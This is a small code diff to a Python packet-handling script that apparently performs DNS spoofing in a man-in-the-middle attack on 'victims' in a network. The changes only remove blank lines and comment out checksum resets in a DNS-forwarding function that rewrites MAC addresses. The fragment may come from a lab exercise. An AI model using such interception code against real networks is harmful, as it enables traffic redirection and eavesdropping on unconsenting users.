@@ -14,8 +14,6 @@ def dns_sorting_start(pkt):
     victims = ATTACK_STATUS['victims']
     network = ipaddress.ip_network(victims, strict=False)
 
-
-
     if pkt.haslayer(IP) and pkt.haslayer(DNS): #check if there is an IP and DNS layer
         src_ip = pkt[IP].src 
         dst_ip = pkt[IP].dst
@@ -53,8 +51,8 @@ def match_website(websites,domain_name):
 
 def forward_dns(pkt, dst_ip):
     #A VERIFIER !!!
-    pkt[IP].chksum = None  
-    pkt[UDP].chksum = None  
+    # pkt[IP].chksum = None  
+    # pkt[UDP].chksum = None  
     
     pkt[Ether].src = pkt[Ether].dst #we replace the sender MAC with our
     dst_MAC = get_MAC(dst_ip)#we replace the destination MAC by the real one 
